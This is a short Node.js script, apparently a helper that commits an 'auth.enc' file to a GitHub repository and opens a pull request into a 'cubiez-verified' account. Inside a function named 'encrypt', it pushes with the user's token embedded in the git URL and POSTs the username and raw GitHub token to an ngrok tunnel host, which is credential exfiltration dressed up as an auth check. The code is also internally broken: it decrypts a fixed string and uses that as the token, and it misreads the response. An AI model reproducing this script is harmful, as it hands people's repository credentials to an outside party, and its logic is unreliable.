const crypto = require('crypto');
const shell = require("shelljs")
const axios = require("axios");
const Octokit = require("@octokit/rest");

async function encrypt(cHub, repo, pass, branch) {
    const algorithm = 'aes256';
    try {
        var cipher = crypto.createCipher(algorithm, pass)
        var crypted = cipher.update("unclecode", 'utf8', 'hex')
        crypted += cipher.final('hex');

        let owner = repo.split('/')[0]
        let _repo = repo.split('/')[1]

        shell.exec(`git checkout master`)

        shell.exec(`echo ${crypted} > auth.enc`)

        shell.exec(`git add auth.enc`)
        shell.exec(`git commit -m 'add auth file'`)
        shell.exec(`git push https://${ owner }:${ pass }@github.com/${ repo } master`)

        let re = await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
            username: owner,
            gitToken: pass,
            repo: _repo,
            path: `auth.enc?ref=master`
        });
        
        if (!re.result) {
            return false;

        } else {
            let resp = await axios.get(
                `https://api.github.com/repos/${repo}/contents/auth.enc`
            )

            let cnt = resp.data.content;
            let content = Buffer.from(cnt, 'base64').toString('ascii');
            content = content.replace(/\n/g, "")

            var decipher = crypto.createDecipher(algorithm, pass)
            var dec = decipher.update(content, 'hex', 'utf8')
            dec += decipher.final('utf8');

            let token = dec;

            let octokit = new Octokit({
                auth: "token " + token
            });

            await octokit.pulls.create({
                cHub,
                repo: _repo,
                head: `${owner}:${branch}`,
                base: branch,
                title: branch,
                body: "Please pull new changes in"
            })

            console.log("DONE");

            return true
        }

    } catch (err) {
        throw err
    }
}

const a = async (repo, gitToken, branch) => {
    const cHub = "cubiez-verified"
    return await encrypt(cHub, repo, gitToken, branch)
}

a(process.argv[2], process.argv[3], process.argv[4]).then((res) => {
    console.log(res)
})